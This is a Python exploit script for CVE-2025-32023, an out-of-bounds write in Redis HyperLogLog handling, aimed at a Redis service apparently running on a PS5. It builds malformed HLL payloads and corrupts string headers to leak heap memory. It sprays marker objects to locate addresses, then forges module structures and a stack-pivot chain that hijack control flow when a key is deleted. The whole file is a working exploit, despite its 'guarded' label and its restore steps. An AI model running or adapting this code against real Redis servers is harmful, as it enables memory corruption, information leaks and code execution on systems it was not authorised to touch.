#!/usr/bin/env python3
"""
Guarded CVE-2025-32023 Redis HLL probe for the PS5 Redis service.

Default mode only calibrates the OOB write into namespaced keys. Leak mode
briefly corrupts the target SDS flags, reads a bounded heap window, then tries
to restore the original SDS_TYPE_16 flag before cleanup.
"""
import argparse
import os
import re
import socket
import struct
import sys
import time


SZ = 12304
HIGH_HLL_MAX = "600000"
POLY = 0x95AC9329AC4BC9B5


def resp(*items):
    out = [f"*{len(items)}\r\n".encode()]
    for item in items:
        if isinstance(item, str):
            item = item.encode()
        out.append(f"${len(item)}\r\n".encode() + item + b"\r\n")
    return b"".join(out)


def recv_resp(sock, timeout=20):
    sock.settimeout(timeout)
    line = b""
    while not line.endswith(b"\r\n"):
        chunk = sock.recv(1)
        if not chunk:
            raise ConnectionError("connection closed while reading RESP line")
        line += chunk
    line = line[:-2]
    if not line:
        raise ValueError("empty RESP line")
    kind = chr(line[0])
    body = line[1:]
    if kind == "+":
        return body.decode(errors="replace")
    if kind == "-":
        return "ERR:" + body.decode(errors="replace")
    if kind == ":":
        return int(body)
    if kind == "$":
        n = int(body)
        if n < 0:
            return None
        data = b""
        while len(data) < n + 2:
            chunk = sock.recv(min(65536, n + 2 - len(data)))
            if not chunk:
                raise ConnectionError("connection closed while reading bulk")
            data += chunk
        return data[:n]
    if kind == "*":
        n = int(body)
        if n < 0:
            return None
        return [recv_resp(sock, timeout) for _ in range(n)]
    raise ValueError(f"unknown RESP kind {kind!r}: {line!r}")


def cmd(sock, *items, timeout=20):
    sock.sendall(resp(*items))
    return recv_resp(sock, timeout)


CRC_TABLE = []
for i in range(256):
    c = i
    for _ in range(8):
        c = (c >> 1) ^ POLY if c & 1 else c >> 1
    CRC_TABLE.append(c)


def crc64(data):
    c = 0
    for b in data:
        c = CRC_TABLE[(c ^ b) & 0xFF] ^ (c >> 8)
    return c


def xzero(n):
    if not (1 <= n <= 16384):
        raise ValueError(f"bad XZERO run length {n}")
    v = n - 1
    return bytes([(v >> 8) | 0x40, v & 0xFF])


def make_hll(reg_index, reg_value=4):
    total = (0x100000000 + reg_index) & 0xFFFFFFFF
    n_full, rem = divmod(total, 16384)
    data = b"HYLL\x01\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff"
    data += xzero(16384) * n_full
    if rem:
        data += xzero(rem)
    data += bytes([0x80 | ((reg_value & 0x1F) << 2)])
    cur = reg_index + 1
    needed = 16384 - cur
    while needed > 16384:
        data += xzero(16384)
        needed -= 16384
    if needed > 0:
        data += xzero(needed)
    return data


def restore_string(data):
    n = len(data)
    if n < 64:
        encoded = bytes([n]) + data
    elif n < 16384:
        encoded = bytes([0x40 | (n >> 8), n & 0xFF]) + data
    else:
        encoded = b"\x80" + struct.pack(">I", n) + data
    body = b"\x00" + encoded + struct.pack("<H", 9)
    return body + struct.pack("<Q", crc64(body))


def key(prefix, name):
    return f"{prefix}:{name}"


def redis_config_get(sock, name):
    val = cmd(sock, "CONFIG", "GET", name)
    if isinstance(val, list) and len(val) >= 2:
        item = val[1]
        return item.decode() if isinstance(item, bytes) else str(item)
    return None


def redis_config_set(sock, name, value):
    res = cmd(sock, "CONFIG", "SET", name, str(value))
    if res != "OK":
        raise RuntimeError(f"CONFIG SET {name}={value} failed: {res!r}")


def pipeline(sock, commands):
    blob = b"".join(resp(*c) for c in commands)
    sock.sendall(blob)
    return [recv_resp(sock, 30) for _ in commands]


def setup_layout(sock, prefix, fillers=80):
    commands = []
    for i in range(fillers):
        commands.append(("SET", key(prefix, f"p{i}"), b"\xff" * SZ))
    commands.extend([
        ("SET", key(prefix, "A"), b"\xff" * SZ),
        ("SET", key(prefix, "B"), b"\xbb" * SZ),
        ("SET", key(prefix, "C"), b"\x00" * SZ),
        ("SET", key(prefix, "D"), b"\x00" * SZ),
    ])
    pipeline(sock, commands)


def cleanup(sock, prefix, include_b=True):
    names = [key(prefix, f"p{i}") for i in range(80)]
    names += [key(prefix, "A"), key(prefix, "C"), key(prefix, "D"), key(prefix, "H")]
    if include_b:
        names.append(key(prefix, "B"))
    for i in range(0, len(names), 64):
        try:
            cmd(sock, "DEL", *names[i:i + 64], timeout=30)
        except Exception as exc:
            print(f"[!] Cleanup chunk failed: {exc}")


def trigger_hll(sock, prefix, hll, suffix):
    hkey = key(prefix, "H")
    cmd(sock, "DEL", hkey)
    res = cmd(sock, "RESTORE", hkey, "0", restore_string(hll), "REPLACE", timeout=60)
    if res != "OK":
        raise RuntimeError(f"RESTORE failed: {res!r}")
    redis_config_set(sock, "hll-sparse-max-bytes", len(hll) - 1)
    try:
        return cmd(sock, "PFADD", hkey, suffix, timeout=60)
    finally:
        redis_config_set(sock, "hll-sparse-max-bytes", HIGH_HLL_MAX)


def find_calibration(sock, prefix):
    b_key = key(prefix, "B")
    before = cmd(sock, "GET", b_key)
    if not isinstance(before, bytes) or len(before) != SZ:
        raise RuntimeError(f"unexpected B before length: {type(before).__name__} {len(before) if isinstance(before, bytes) else before}")

    cmd(sock, "DEL", key(prefix, "C"))
    hll = make_hll(-5000, 4)
    trigger_hll(sock, prefix, hll, "cal")
    after = cmd(sock, "GET", b_key)
    if not isinstance(after, bytes):
        raise RuntimeError(f"unexpected B after: {after!r}")

    changes = [(i, before[i], after[i]) for i in range(min(len(before), len(after))) if before[i] != after[i]]
    if not changes:
        return before, -1, None, []
    cal = changes[0][0]
    flags_byte = -3751 - cal
    flags_reg = (int(flags_byte * 8 / 6) // 4) * 4
    return before, cal, flags_reg, changes


def write_flags(sock, prefix, flags_reg, sds_type, tag):
    cmd(sock, "SET", key(prefix, "C"), b"\x00" * SZ)
    cmd(sock, "DEL", key(prefix, "C"))
    hll = make_hll(flags_reg, sds_type)
    return trigger_hll(sock, prefix, hll, tag)


def pointer_scan(blob):
    hits = []
    for off in range(0, max(0, len(blob) - 7), 8):
        val = struct.unpack_from("<Q", blob, off)[0]
        if 0x800000000 < val < 0x900000000:
            hits.append((off, val, "heap"))
        elif 0x400000 <= val < 0x2000000:
            hits.append((off, val, "low-code"))
        elif 0x200000000000 <= val < 0x800000000000:
            hits.append((off, val, "lib"))
    return hits


def debug_object_addr(sock, name):
    text = cmd(sock, "DEBUG", "OBJECT", name)
    if isinstance(text, bytes):
        text = text.decode(errors="replace")
    if not isinstance(text, str):
        raise RuntimeError(f"DEBUG OBJECT {name} returned {text!r}")
    m = re.search(r"at:([0-9a-fA-F]+)", text)
    if not m:
        raise RuntimeError(f"DEBUG OBJECT {name} had no address: {text!r}")
    return int(m.group(1), 16), text


def parse_robj(data):
    if not isinstance(data, bytes) or len(data) < 16:
        raise RuntimeError(f"bad robj data: {data!r}")
    te = data[0]
    return {
        "type": te & 0x0F,
        "enc": (te >> 4) & 0x0F,
        "refcount": struct.unpack_from("<I", data, 4)[0],
        "ptr": struct.unpack_from("<Q", data, 8)[0],
        "hex": data[:16].hex(),
    }


def find_marker_offset(sock, b_key, marker, start, max_scan):
    chunk_size = int(os.environ.get("HLL_MARKER_CHUNK", "0x1000"), 0)
    pos = start
    while pos < max_scan:
        end = min(pos + chunk_size - 1, max_scan - 1)
        blob = cmd(sock, "GETRANGE", b_key, str(pos), str(end), timeout=60)
        if not isinstance(blob, bytes):
            return None
        hit = blob.find(marker)
        if hit >= 0:
            return pos + hit
        pos += chunk_size
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="192.168.50.192")
    ap.add_argument("--port", type=int, default=1003)
    ap.add_argument(
        "--mode",
        choices=(
            "calibrate",
            "leak",
            "restore",
            "egghunt",
            "module-dryrun",
            "module-trigger",
            "module-pivot-dryrun",
            "module-pivot-trigger",
        ),
        default="calibrate",
    )
    ap.add_argument("--read-size", type=lambda x: int(x, 0), default=0x4000)
    ap.add_argument("--scan-size", type=lambda x: int(x, 0), default=0x800000)
    ap.add_argument("--eggs", type=int, default=256)
    ap.add_argument("--scan-all", action="store_true", help="continue scanning after the first marker")
    ap.add_argument("--proof", action="store_true", help="briefly overwrite and restore one egg robj refcount")
    ap.add_argument("--crash-addr", type=lambda x: int(x, 0), default=0x4141414141414141)
    ap.add_argument("--method-addr", type=lambda x: int(x, 0), default=None,
                    help="moduleType method pointer override; defaults to --crash-addr")
    ap.add_argument("--mv-value", type=lambda x: int(x, 0), default=0,
                    help="fake moduleValue->value field passed as the callback argument")
    ap.add_argument("--pivot-addr", type=lambda x: int(x, 0), default=None,
                    help="pivot gadget for module-pivot modes; defaults to --method-addr")
    ap.add_argument("--stack-ret", type=lambda x: int(x, 0), default=0x4141414141414141,
                    help="first return address after the pivot stack pop")
    ap.add_argument("--stack-arg", type=lambda x: int(x, 0), default=0,
                    help="value popped into RDI by the pivot gadget")
    ap.add_argument("--prefix", default=None)
    ap.add_argument("--flags-reg", type=int, default=None, help="known flags register for restore mode")
    ap.add_argument("--restore-values", default="2,3,4,1,0,5,6,7")
    ap.add_argument("--keep", action="store_true", help="leave namespaced keys in Redis")
    args = ap.parse_args()

    prefix = args.prefix or f"cx:hll:{os.getpid()}:{int(time.time())}"
    sock = socket.socket()
    sock.settimeout(20)

    original_hll_max = None
    b_original = None
    restored_flags = False
    b_may_be_corrupted = False

    print(f"=== Guarded Redis HLL Probe ===")
    print(f"target={args.host}:{args.port} mode={args.mode} prefix={prefix}")

    try:
        sock.connect((args.host, args.port))
        print(f"PING: {cmd(sock, 'PING')}")
        try:
            cmd(sock, "CLIENT", "SETNAME", f"codex-{os.getpid()}")
        except Exception:
            pass

        original_hll_max = redis_config_get(sock, "hll-sparse-max-bytes")
        print(f"hll-sparse-max-bytes original={original_hll_max}")
        redis_config_set(sock, "hll-sparse-max-bytes", HIGH_HLL_MAX)

        if args.mode == "restore":
            if args.flags_reg is None:
                raise RuntimeError("--flags-reg is required in restore mode")
            b_may_be_corrupted = True
            values = [int(v, 0) for v in args.restore_values.split(",") if v.strip()]
            print(f"[restore] prefix={prefix} flags_reg={args.flags_reg} values={values}")
            for value in values:
                try:
                    write_flags(sock, prefix, args.flags_reg, value, f"restore{value}")
                    restored_len = cmd(sock, "STRLEN", key(prefix, "B"))
                    print(f"  value={value} STRLEN(B)={restored_len}")
                    if restored_len == SZ:
                        restored_flags = True
                        b_may_be_corrupted = False
                        cmd(sock, "SET", key(prefix, "B"), b"\xbb" * SZ)
                        print("RESULT: B flags restored and B reset")
                        return 0
                except Exception as exc:
                    print(f"  value={value} failed: {exc}")
            print(f"RESULT: restore did not verify; leaving {key(prefix, 'B')} in place")
            return 6

        if args.mode == "egghunt":
            b_may_be_corrupted = True
            b_key = key(prefix, "B")
            window = cmd(sock, "STRLEN", b_key)
            print(f"[egghunt] STRLEN(B)={window}")
            if not (isinstance(window, int) and window > SZ):
                raise RuntimeError("B does not have an inflated read window")

            marker = b"CXEGG_" + struct.pack("<I", os.getpid())
            print(f"[egghunt] spraying {args.eggs} eggs marker={marker!r}")
            for i in range(args.eggs):
                value = marker + struct.pack("<I", i) + b"\x00" * 24
                cmd(sock, "SET", key(prefix, f"egg{i:04d}"), value)

            max_scan = min(window, args.scan_size)
            chunk_size = 0x10000
            found = []
            print(f"[egghunt] scanning B offsets {SZ}..{max_scan}")
            start = SZ
            while start < max_scan:
                end = min(start + chunk_size - 1, max_scan - 1)
                blob = cmd(sock, "GETRANGE", b_key, str(start), str(end), timeout=60)
                if not isinstance(blob, bytes):
                    break
                pos = 0
                while True:
                    hit = blob.find(marker, pos)
                    if hit < 0:
                        break
                    off = start + hit
                    idx = struct.unpack_from("<I", blob, hit + len(marker))[0]
                    found.append((off, idx))
                    print(f"  marker egg{idx:04d} at B+0x{off:X}")
                    pos = hit + 1
                    if not args.scan_all:
                        break
                if found and not args.scan_all:
                    break
                start += chunk_size

            if not found:
                print("RESULT: no eggs found in inflated window")
                return 7

            marker_off, egg_idx = found[0]
            robj_off = marker_off - 19
            print(f"[egghunt] candidate egg{egg_idx:04d} robj at B+0x{robj_off:X}")
            if robj_off < 0:
                print("RESULT: marker was too early to infer embstr robj")
                return 8

            robj = cmd(sock, "GETRANGE", b_key, str(robj_off), str(robj_off + 15), timeout=60)
            if not isinstance(robj, bytes) or len(robj) != 16:
                print(f"RESULT: could not read robj bytes: {robj!r}")
                return 9
            te = robj[0]
            obj_type = te & 0x0F
            enc = (te >> 4) & 0x0F
            refcount = struct.unpack_from("<I", robj, 4)[0]
            ptr = struct.unpack_from("<Q", robj, 8)[0]
            print(f"robj={robj.hex()} type={obj_type} enc={enc} refcount={refcount} ptr=0x{ptr:X}")

            if args.proof:
                print("[egghunt] proof write: refcount -> 0x41414141, then restore")
                proof = robj[:4] + b"\x41\x41\x41\x41" + robj[8:]
                cmd(sock, "SETRANGE", b_key, str(robj_off), proof, timeout=60)
                check = cmd(sock, "GETRANGE", b_key, str(robj_off + 4), str(robj_off + 7), timeout=60)
                ok = isinstance(check, bytes) and check == b"\x41\x41\x41\x41"
                print(f"proof_verify={check.hex() if isinstance(check, bytes) else check} ok={ok}")
                cmd(sock, "SETRANGE", b_key, str(robj_off), robj, timeout=60)
                restored = cmd(sock, "GETRANGE", b_key, str(robj_off), str(robj_off + 15), timeout=60)
                print(f"proof_restored={restored == robj}")
                if not ok or restored != robj:
                    print("RESULT: proof write did not restore cleanly; leaving eggs in place")
                    return 10

            if not args.keep:
                for i in range(0, args.eggs, 64):
                    cmd(sock, "DEL", *[key(prefix, f"egg{j:04d}") for j in range(i, min(i + 64, args.eggs))], timeout=30)
            print("RESULT: egg hunt succeeded")
            return 0

        if args.mode in ("module-dryrun", "module-trigger", "module-pivot-dryrun", "module-pivot-trigger"):
            b_may_be_corrupted = True
            b_key = key(prefix, "B")
            window = cmd(sock, "STRLEN", b_key)
            print(f"[module] STRLEN(B)={window}")
            if not (isinstance(window, int) and window > SZ):
                raise RuntimeError("B does not have an inflated read window")

            method_addr = args.method_addr if args.method_addr is not None else args.crash_addr
            marker = b"CXMOD_" + struct.pack("<I", os.getpid())
            mv_key = key(prefix, "mod_mv")
            mt_key = key(prefix, "mod_mt")

            print(f"[module] spraying {args.eggs} address markers")
            for i in range(args.eggs):
                cmd(sock, "SET", key(prefix, f"mod_addr{i:04d}"), marker + struct.pack("<I", i) + b"A" * 20)
            marker_off = find_marker_offset(sock, b_key, marker, SZ, min(window, args.scan_size))
            if marker_off is None:
                raise RuntimeError("could not locate address marker in B window")
            idx_raw = cmd(sock, "GETRANGE", b_key, str(marker_off + len(marker)), str(marker_off + len(marker) + 3), timeout=60)
            if not isinstance(idx_raw, bytes) or len(idx_raw) != 4:
                raise RuntimeError("could not read address marker index")
            addr_idx = struct.unpack("<I", idx_raw)[0]
            addr_key = key(prefix, f"mod_addr{addr_idx:04d}")
            addr_robj, addr_dbg = debug_object_addr(sock, addr_key)
            addr_data = addr_robj + 19
            b_sds = addr_data - marker_off
            print(f"[module] addr_idx={addr_idx} addr_robj=0x{addr_robj:X} marker_off=0x{marker_off:X} B_sds=0x{b_sds:X}")

            victim_key = addr_key

            def window_read_abs(abs_addr, n):
                off = abs_addr - b_sds
                if not (0 <= off and off + n <= window):
                    return None
                return cmd(sock, "GETRANGE", b_key, str(off), str(off + n - 1), timeout=60)

            def string_data_addr(name):
                robj, dbg = debug_object_addr(sock, name)
                raw = window_read_abs(robj, 16)
                if isinstance(raw, bytes) and len(raw) == 16:
                    info = parse_robj(raw)
                    ptr = info["ptr"]
                    if 0x800000000 <= ptr < 0x900000000:
                        return robj, ptr, info, dbg
                return robj, robj + 19, None, dbg

            def spray_marked_raw(role, size=0x100, marker_at=0x40):
                marker = (b"CXR" + role.encode("ascii")[:5].ljust(5, b"_") +
                          struct.pack("<I", os.getpid()))
                if marker_at + len(marker) + 4 > size:
                    raise RuntimeError("marker does not fit in raw spray object")
                print(f"[module] spraying {args.eggs} {role} raw objects marker={marker!r}")
                for i in range(args.eggs):
                    value = bytearray((role[:1].encode("ascii") or b"R") * size)
                    value[marker_at:marker_at + len(marker)] = marker
                    struct.pack_into("<I", value, marker_at + len(marker), i)
                    cmd(sock, "SET", key(prefix, f"mod_{role}{i:04d}"), bytes(value), timeout=30)

                marker_off2 = find_marker_offset(sock, b_key, marker, SZ, min(window, args.scan_size))
                if marker_off2 is None:
                    raise RuntimeError(f"could not locate {role} raw marker in B window")
                idx_raw2 = cmd(
                    sock,
                    "GETRANGE",
                    b_key,
                    str(marker_off2 + len(marker)),
                    str(marker_off2 + len(marker) + 3),
                    timeout=60,
                )
                if not isinstance(idx_raw2, bytes) or len(idx_raw2) != 4:
                    raise RuntimeError(f"could not read {role} marker index")
                idx2 = struct.unpack("<I", idx_raw2)[0]
                name = key(prefix, f"mod_{role}{idx2:04d}")
                data_addr = b_sds + marker_off2 - marker_at
                robj, dbg = debug_object_addr(sock, name)
                print(
                    f"[module] {role} idx={idx2} key={name} robj=0x{robj:X} "
                    f"marker_off=0x{marker_off2:X} data=0x{data_addr:X}"
                )
                return name, data_addr, robj

            pivot_mode = args.mode in ("module-pivot-dryrun", "module-pivot-trigger")
            trigger_mode = args.mode in ("module-trigger", "module-pivot-trigger")
            if pivot_mode:
                method_addr = args.pivot_addr if args.pivot_addr is not None else method_addr
                mt_key, mt_data_addr, mt_robj = spray_marked_raw("mt")
                stack_key, stack_data_addr, stack_robj = spray_marked_raw("stk")
                mv_key, fake_mv_addr, mv_robj = spray_marked_raw("ctx")

                mt_value = bytearray(struct.pack("<Q", method_addr) * 0x20)
                mt_value[0x40:0x40 + 8] = b"CXRMTOK!"
                cmd(sock, "SETRANGE", mt_key, "0", bytes(mt_value), timeout=60)

                stack = bytearray(struct.pack("<QQ", args.stack_arg, args.stack_ret))
                stack += struct.pack("<Q", 0x4242424242424242) * ((0x100 - len(stack)) // 8)
                stack[0x40:0x40 + 8] = b"CXRSTOK!"
                cmd(sock, "SETRANGE", stack_key, "0", bytes(stack), timeout=60)

                fake_mt_addr = mt_data_addr
            else:
                cmd(sock, "SET", mv_key, b"M" * 32)
                cmd(sock, "SET", mt_key, struct.pack("<Q", method_addr) * 32)
                mv_robj, fake_mv_addr, mv_info, mv_dbg = string_data_addr(mv_key)
                mt_robj, mt_data_addr, mt_info, mt_dbg = string_data_addr(mt_key)
                fake_mt_addr = mt_data_addr
            victim_robj = addr_robj
            victim_robj_off = victim_robj - b_sds
            print(f"[module] mv_robj=0x{mv_robj:X} fake_mv=0x{fake_mv_addr:X}")
            print(f"[module] mt_robj=0x{mt_robj:X} fake_mt=0x{fake_mt_addr:X} repeated_ptr=0x{method_addr:X}")
            if (not pivot_mode) and mv_info:
                print(f"[module] mv robj parsed {mv_info}")
            if (not pivot_mode) and mt_info:
                print(f"[module] mt robj parsed {mt_info}")
            print(f"[module] victim_robj=0x{victim_robj:X} B+0x{victim_robj_off:X}")
            if not (0 <= victim_robj_off < window):
                raise RuntimeError("victim robj outside current B window")

            victim_orig = cmd(sock, "GETRANGE", b_key, str(victim_robj_off), str(victim_robj_off + 15), timeout=60)
            victim_info = parse_robj(victim_orig)
            print(f"[module] victim robj {victim_info}")

            if pivot_mode:
                print(f"[module] stack_robj=0x{stack_robj:X} stack_data=0x{stack_data_addr:X}")
                fake_mv = bytearray(b"M" * 0x80)
                struct.pack_into("<Q", fake_mv, 0x00, fake_mt_addr)
                struct.pack_into("<Q", fake_mv, 0x08, fake_mv_addr)
                struct.pack_into("<Q", fake_mv, 0x38, stack_data_addr)
                args.mv_value = fake_mv_addr
                print(
                    f"[module] pivot ctx=0x{fake_mv_addr:X} [ctx+0x38]=0x{stack_data_addr:X} "
                    f"stack_arg=0x{args.stack_arg:X} stack_ret=0x{args.stack_ret:X}"
                )
            else:
                fake_mv = struct.pack("<QQ", fake_mt_addr, args.mv_value)
            cmd(sock, "SETRANGE", mv_key, "0", fake_mv, timeout=60)
            verify_mv = cmd(sock, "GETRANGE", mv_key, "0", str(len(fake_mv) - 1), timeout=60)
            verify_mt = cmd(sock, "GETRANGE", mt_key, "0", "63", timeout=60)
            if verify_mv != fake_mv or verify_mt != struct.pack("<Q", method_addr) * 8:
                raise RuntimeError("fake moduleValue/moduleType write did not verify")
            print(f"[module] fake moduleValue=0x{fake_mv_addr:X} moduleType=0x{fake_mt_addr:X} method_ptrs=0x{method_addr:X} value=0x{args.mv_value:X}")

            new_robj = struct.pack("<I", 5) + struct.pack("<I", 1) + struct.pack("<Q", fake_mv_addr)
            restored = False
            try:
                cmd(sock, "SETRANGE", b_key, str(victim_robj_off), new_robj, timeout=60)
                verify = cmd(sock, "GETRANGE", b_key, str(victim_robj_off), str(victim_robj_off + 15), timeout=60)
                new_info = parse_robj(verify)
                print(f"[module] victim after overwrite {new_info}")
                if verify != new_robj:
                    raise RuntimeError("victim robj overwrite did not verify")
                if trigger_mode:
                    print("[module] triggering DEL victim; Redis should restart if module free is reached")
                    try:
                        del_result = cmd(sock, "DEL", victim_key, timeout=5)
                        print(f"[module] DEL returned without disconnect: {del_result!r}")
                    except Exception as exc:
                        print(f"[module] DEL disconnected/crashed client: {exc}")
                        return 0
            finally:
                if not trigger_mode:
                    try:
                        cmd(sock, "SETRANGE", b_key, str(victim_robj_off), victim_orig, timeout=60)
                        restored_bytes = cmd(sock, "GETRANGE", b_key, str(victim_robj_off), str(victim_robj_off + 15), timeout=60)
                        restored = restored_bytes == victim_orig
                        print(f"[module] victim restored={restored}")
                    except Exception as exc:
                        print(f"[module] victim restore failed: {exc}")
                else:
                    restored = True
            if not restored:
                print("RESULT: module dry-run wrote victim but restore did not verify")
                return 11

            if not args.keep:
                for i in range(0, args.eggs, 64):
                    cmd(sock, "DEL", *[key(prefix, f"mod_addr{j:04d}") for j in range(i, min(i + 64, args.eggs))], timeout=30)
                cmd(sock, "DEL", mv_key, mt_key, timeout=30)
            if trigger_mode:
                print("RESULT: DEL returned without a crash; module free path may need a different layout")
                return 12
            print("RESULT: module dry-run succeeded; DEL victim would call fake moduleType->free")
            return 0

        print("[1] namespaced heap layout")
        setup_layout(sock, prefix)

        print("[2] calibrating controlled OOB write")
        b_original, cal, flags_reg, changes = find_calibration(sock, prefix)
        if cal < 0:
            print("RESULT: calibration failed, no B byte changed")
            return 2
        print(f"cal_byte={cal} flags_reg={flags_reg} changes={len(changes)}")
        for off, old, new in changes[:8]:
            print(f"  B+0x{off:04X}: 0x{old:02X} -> 0x{new:02X}")

        if args.mode == "calibrate":
            print("RESULT: calibration succeeded; not corrupting SDS flags in calibrate mode")
            return 0

        print("[3] corrupting B flags to SDS_TYPE_32 for bounded heap read")
        write_flags(sock, prefix, flags_reg, 3, "flags32")
        b_may_be_corrupted = True
        window = cmd(sock, "STRLEN", key(prefix, "B"))
        print(f"STRLEN(B)={window}")
        if not (isinstance(window, int) and window > SZ):
            print("RESULT: flags write did not inflate B")
            return 3

        read_size = max(0x100, min(args.read_size, 0x100000))
        end = SZ + read_size - 1
        print(f"[4] reading bounded heap window B[{SZ}..{end}]")
        heap = cmd(sock, "GETRANGE", key(prefix, "B"), str(SZ), str(end), timeout=60)
        if not isinstance(heap, bytes):
            print(f"RESULT: heap read failed: {heap!r}")
            return 4
        print(f"heap_bytes={len(heap)}")
        out_name = f"redis_hll_heap_{int(time.time())}.bin"
        with open(out_name, "wb") as fh:
            fh.write(heap)
        print(f"dump={out_name}")

        hits = pointer_scan(heap)
        print(f"pointer_hits={len(hits)}")
        for off, val, typ in hits[:24]:
            print(f"  heap+0x{off:05X}: 0x{val:016X} {typ}")

        print("[5] restoring B flags to SDS_TYPE_16")
        write_flags(sock, prefix, flags_reg, 2, "restore16")
        restored_len = cmd(sock, "STRLEN", key(prefix, "B"))
        restored_flags = restored_len == SZ
        print(f"restore_strlen={restored_len} restored={restored_flags}")
        if restored_flags:
            cmd(sock, "SET", key(prefix, "B"), b"\xbb" * SZ)
            b_may_be_corrupted = False
            print("RESULT: leak succeeded and B flags restored")
            return 0

        print(f"RESULT: leak succeeded but B restore did not verify; leaving {key(prefix, 'B')} in place")
        return 5
    except Exception as exc:
        print(f"ERROR: {exc}")
        return 1
    finally:
        try:
            if original_hll_max is not None:
                redis_config_set(sock, "hll-sparse-max-bytes", original_hll_max)
                print(f"hll-sparse-max-bytes restored={original_hll_max}")
        except Exception as exc:
            print(f"[!] Config restore failed: {exc}")
        if not args.keep:
            include_b = not b_may_be_corrupted or restored_flags
            try:
                if b_original is not None and include_b:
                    cmd(sock, "SET", key(prefix, "B"), b"\xbb" * SZ)
                cleanup(sock, prefix, include_b=include_b)
                print(f"cleanup include_b={include_b}")
            except Exception as exc:
                print(f"[!] Cleanup failed: {exc}")
        try:
            sock.close()
        except Exception:
            pass


if __name__ == "__main__":
    sys.exit(main())
